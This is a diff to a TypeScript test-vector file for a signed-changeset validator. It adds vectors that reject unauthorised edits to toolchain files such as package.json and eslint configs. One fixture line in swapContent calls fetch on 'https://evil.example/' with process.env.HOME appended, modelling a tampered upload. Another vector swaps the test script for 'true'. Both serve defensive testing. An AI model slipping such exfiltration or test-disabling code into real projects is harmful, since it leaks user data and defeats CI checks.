@@ -8,9 +8,24 @@
  *
  * Deterministic: fixed Ed25519 seed (Ed25519 signatures are deterministic), no clock, no randomness.
  */
-import { createPrivateKey, createPublicKey, sign } from "node:crypto";
-import type { AbuSpec, Changeset, ChangesetErrorCode, ChangesetFile, RepoManifest } from "@waronsaas/contracts";
-import { changesetSigningPayload, computeSubmissionSha256, type ScopeContext, type SubmissionContext, sha256Hex } from "./index.js";
+import { createPublicKey } from "node:crypto";
+import {
+  type AbuSpec,
+  type Changeset,
+  type ChangesetErrorCode,
+  type ChangesetFile,
+  DEFAULT_TOOLCHAIN_PATHS,
+  type RepoManifest,
+} from "@waronsaas/contracts";
+import {
+  changesetSigningPayload,
+  ed25519PrivateKeyFromSeed,
+  encodeDevicePublicKey,
+  sha256Of,
+  signEd25519,
+  submissionSha256,
+} from "@waronsaas/contracts/canonical";
+import type { ScopeContext, SubmissionContext } from "./index.js";
 
 export interface ChangesetVector {
   name: string;
@@ -30,15 +45,30 @@ const IDS = {
   deviceId: "0192ab3c-0000-7000-8000-000000000003",
 };
 
-const PKCS8_ED25519_PREFIX = Buffer.from("302e020100300506032b657004220420", "hex");
-const keyFromSeed = (seedByte: number) =>
-  createPrivateKey({ key: Buffer.concat([PKCS8_ED25519_PREFIX, Buffer.alloc(32, seedByte)]), format: "der", type: "pkcs8" });
-export const VECTOR_DEVICE_KEY = keyFromSeed(7);
-const WRONG_DEVICE_KEY = keyFromSeed(9);
-/** base64 of the raw 32-byte public key: the registered device key used by every vector. */
-export const VECTOR_DEVICE_PUBLIC_KEY = (createPublicKey(VECTOR_DEVICE_KEY).export({ format: "der", type: "spki" }) as Buffer)
-  .subarray(-32)
-  .toString("base64");
+export const VECTOR_DEVICE_KEY = ed25519PrivateKeyFromSeed(Buffer.alloc(32, 7));
+const WRONG_DEVICE_KEY = ed25519PrivateKeyFromSeed(Buffer.alloc(32, 9));
+/** The registered device key used by every vector, in the C-5 wire format (base64 of the raw 32 bytes). */
+export const VECTOR_DEVICE_PUBLIC_KEY = encodeDevicePublicKey(createPublicKey(VECTOR_DEVICE_KEY));
+
+/**
+ * Signs with the canonical C-4 payload. A changeset the schema refuses (invalid path, symlink mode) has no
+ * C-4 payload; it gets a placeholder signature, and validateSubmission rejects it on the validator's codes.
+ */
+function trySign(c: Changeset, key: typeof VECTOR_DEVICE_KEY): string {
+  try {
+    return signEd25519(key, changesetSigningPayload(c));
+  } catch {
+    return "unsignable-schema-invalid";
+  }
+}
+/** C-3 refuses duplicate paths; the duplicate-path vector gets a placeholder diff hash. */
+function tryDiffHash(parent: string, files: ChangesetFile[]): string {
+  try {
+    return submissionSha256(parent, files);
+  } catch {
+    return `sha256:${"0".repeat(64)}`;
+  }
+}
 
 export const vectorManifest = (over: Partial<RepoManifest> = {}): RepoManifest => ({
   schema: "wos-repo.v1",
@@ -50,6 +80,7 @@ export const vectorManifest = (over: Partial<RepoManifest> = {}): RepoManifest =
   verify: [{ id: "test", run: ["npm", "test"], timeoutSeconds: 600 }],
   protectedPaths: [".github/**", "wos.json", "catalog/**", "roadmaps/**", "features/**"],
   lockfiles: ["package-lock.json"],
+  toolchainPaths: [...DEFAULT_TOOLCHAIN_PATHS],
   generatedPaths: ["modules/contacts/dist/**"],
   migrationsDir: "db/migrations",
   maxChangesetBytes: 4_000_000,
@@ -78,13 +109,14 @@ export const EXISTING_PATHS: readonly string[] = [
   "modules/contacts/Api/handler.ts",
   "modules/contacts/café.ts",
   "modules/contacts/list.ts",
+  "modules/billing/old.ts",
   "roadmaps/salesforce/ROADMAP.yaml",
 ];
 
 export type UpsertFile = Extract<ChangesetFile, { op: "upsert" }>;
 export const upsert = (path: string, text: string, mode: "100644" | "100755" = "100644"): UpsertFile => {
   const bytes = Buffer.from(text, "utf8");
-  return { op: "upsert", path, mode, contentBase64: bytes.toString("base64"), sha256: sha256Hex(bytes), bytes: bytes.length };
+  return { op: "upsert", path, mode, contentBase64: bytes.toString("base64"), sha256: sha256Of(bytes), bytes: bytes.length };
 };
 export const del = (path: string): ChangesetFile => ({ op: "delete", path });
 
@@ -105,7 +137,7 @@ export function signedChangeset(
     ...(opts.ids ?? IDS),
     parentCommit: parent,
     manifestSha256: opts.manifestSha256 ?? MANIFEST_SHA,
-    submissionSha256: computeSubmissionSha256(parent, files),
+    submissionSha256: tryDiffHash(parent, files),
     files,
     summary: {
       schema: "build-summary.v1",
@@ -117,7 +149,7 @@ export function signedChangeset(
     localVerification: [],
     signature: "",
   };
-  c.signature = sign(null, Buffer.from(changesetSigningPayload(c), "utf8"), opts.key ?? VECTOR_DEVICE_KEY).toString("base64");
+  c.signature = trySign(c, opts.key ?? VECTOR_DEVICE_KEY);
   opts.tamper?.(c);
   return c;
 }
@@ -180,7 +212,10 @@ export function changesetVectors(): ChangesetVector[] {
       abuCtx({
         abu: {
           scope: { write: ["modules/contacts/**", "package-lock.json"], read: [] },
-          resources: [{ key: "lockfile:package-lock.json", mode: "exclusive" }],
+          resources: [
+            { key: "lockfile:package-lock.json", mode: "exclusive" },
+            { key: "toolchain:package-lock.json", mode: "exclusive" },
+          ],
         },
       }),
     ),
@@ -235,7 +270,7 @@ export function changesetVectors(): ChangesetVector[] {
     // -- OUT_OF_SCOPE -------------------------------------------------------------------------------
     v("OUT_OF_SCOPE: another feature's module", ["OUT_OF_SCOPE"], signedChangeset([upsert("modules/billing/x.ts", "x")])),
     v("OUT_OF_SCOPE: sibling directory sharing the prefix", ["OUT_OF_SCOPE"], signedChangeset([upsert("modules/contacts-evil/x.ts", "x")])),
-    v("OUT_OF_SCOPE: delete outside scope", ["OUT_OF_SCOPE"], signedChangeset([del("package.json")])),
+    v("OUT_OF_SCOPE: delete outside scope", ["OUT_OF_SCOPE"], signedChangeset([del("modules/billing/old.ts")])),
     v("OUT_OF_SCOPE: ABU missing from an abu context fails closed", ["OUT_OF_SCOPE"], signedChangeset([ok]), { ...abuCtx(), abu: null }),
     v(
       "OUT_OF_SCOPE: roadmap author writing another app's roadmap",
@@ -247,7 +282,7 @@ export function changesetVectors(): ChangesetVector[] {
     // -- PROTECTED_PATH / WORKFLOW_FILE ---------------------------------------------------------------
     v(
       "PROTECTED_PATH: wos.json even when the ABU scope (a bad graph) includes it",
-      ["PROTECTED_PATH"],
+      ["PROTECTED_PATH", "TOOLCHAIN_WITHOUT_RESOURCE"],
       signedChangeset([upsert("wos.json", "{}")]),
       abuCtx({ abu: { scope: { write: ["modules/contacts/**", "wos.json"], read: [] } } }),
     ),
@@ -275,7 +310,7 @@ export function changesetVectors(): ChangesetVector[] {
     ),
     v(
       "PROTECTED_PATH: a document author may never write wos.json",
-      ["OUT_OF_SCOPE", "PROTECTED_PATH"],
+      ["OUT_OF_SCOPE", "PROTECTED_PATH", "TOOLCHAIN_WITHOUT_RESOURCE"],
       signedChangeset([upsert("wos.json", "{}")]),
       roadmapCtx(),
     ),
@@ -311,10 +346,59 @@ export function changesetVectors(): ChangesetVector[] {
       signedChangeset([upsert("modules/contacts/dist/index.js", "x")]),
     ),
 
+    // -- TOOLCHAIN_WITHOUT_RESOURCE (B-0005: what CI runs is defined by these files) ------------------
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: package.json scripts edited inside the write scope",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("package.json", '{"scripts":{"test":"true"}}')]),
+      abuCtx({ abu: { scope: { write: ["modules/contacts/**", "package.json"], read: [] } } }),
+    ),
+    v(
+      "accepts a package.json edit when the ABU holds exclusive toolchain:package.json",
+      [],
+      signedChangeset([upsert("package.json", '{"scripts":{"test":"vitest run"}}')]),
+      abuCtx({
+        abu: { scope: { write: ["package.json"], read: [] }, resources: [{ key: "toolchain:package.json", mode: "exclusive" }] },
+      }),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: a shared toolchain resource is not enough",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("package.json", "{}")]),
+      abuCtx({ abu: { scope: { write: ["package.json"], read: [] }, resources: [{ key: "toolchain:package.json", mode: "shared" }] } }),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: the resource for another toolchain file does not cover this one",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("modules/contacts/package.json", "{}")]),
+      abuCtx({ abu: { resources: [{ key: "toolchain:package.json", mode: "exclusive" }] } }),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: a nested vitest config inside the module",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("modules/contacts/vitest.config.ts", "export default { test: { include: [] } };")]),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: a new tsconfig variant",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("modules/contacts/tsconfig.build.json", "{}")]),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: case variant of an eslint config",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([upsert("modules/contacts/ESLint.config.mjs", "export default [];")]),
+    ),
+    v(
+      "TOOLCHAIN_WITHOUT_RESOURCE: deleting a toolchain file",
+      ["TOOLCHAIN_WITHOUT_RESOURCE"],
+      signedChangeset([del("package.json")]),
+      abuCtx({ abu: { scope: { write: ["package.json"], read: [] } } }),
+    ),
+
     // -- LOCKFILE_WITHOUT_RESOURCE / MIGRATION_WITHOUT_RESOURCE ---------------------------------------
     v(
-      "LOCKFILE_WITHOUT_RESOURCE: root lockfile in scope, no resource",
-      ["LOCKFILE_WITHOUT_RESOURCE"],
+      "LOCKFILE_WITHOUT_RESOURCE: root lockfile in scope, no resource (it is also a toolchain path)",
+      ["LOCKFILE_WITHOUT_RESOURCE", "TOOLCHAIN_WITHOUT_RESOURCE"],
       signedChangeset([upsert("package-lock.json", "{}\n")]),
       abuCtx({ abu: { scope: { write: ["modules/contacts/**", "package-lock.json"], read: [] } } }),
     ),
@@ -323,7 +407,13 @@ export function changesetVectors(): ChangesetVector[] {
       ["LOCKFILE_WITHOUT_RESOURCE"],
       signedChangeset([upsert("package-lock.json", "{}\n")]),
       abuCtx({
-        abu: { scope: { write: ["package-lock.json"], read: [] }, resources: [{ key: "lockfile:package-lock.json", mode: "shared" }] },
+        abu: {
+          scope: { write: ["package-lock.json"], read: [] },
+          resources: [
+            { key: "lockfile:package-lock.json", mode: "shared" },
+            { key: "toolchain:package-lock.json", mode: "exclusive" },
+          ],
+        },
       }),
     ),
     v(
@@ -381,7 +471,7 @@ export function changesetVectors(): ChangesetVector[] {
     v(
       "HASH_MISMATCH: sha256 does not match content",
       ["HASH_MISMATCH"],
-      signedChangeset([{ ...ok, sha256: sha256Hex("other") } as ChangesetFile]),
+      signedChangeset([{ ...ok, sha256: sha256Of("other") } as ChangesetFile]),
     ),
     v("HASH_MISMATCH: byte count lies", ["HASH_MISMATCH"], signedChangeset([{ ...ok, bytes: 1 } as ChangesetFile])),
     v(
@@ -472,12 +562,12 @@ export function changesetVectors(): ChangesetVector[] {
 function resign(c: Changeset, submissionSha256: string, manifestSha256 = c.manifestSha256) {
   c.submissionSha256 = submissionSha256;
   c.manifestSha256 = manifestSha256;
-  c.signature = sign(null, Buffer.from(changesetSigningPayload(c), "utf8"), VECTOR_DEVICE_KEY).toString("base64");
+  c.signature = trySign(c, VECTOR_DEVICE_KEY);
 }
 
 /** A man-in-the-middle (or a later edit) swaps content and recomputes every hash, but cannot re-sign. */
 function swapContent(c: Changeset) {
   const evil = upsert("modules/contacts/list-endpoint.ts", "fetch('https://evil.example/' + process.env.HOME);\n");
   c.files = [evil];
-  c.submissionSha256 = computeSubmissionSha256(c.parentCommit, c.files);
+  c.submissionSha256 = submissionSha256(c.parentCommit, c.files);
 }
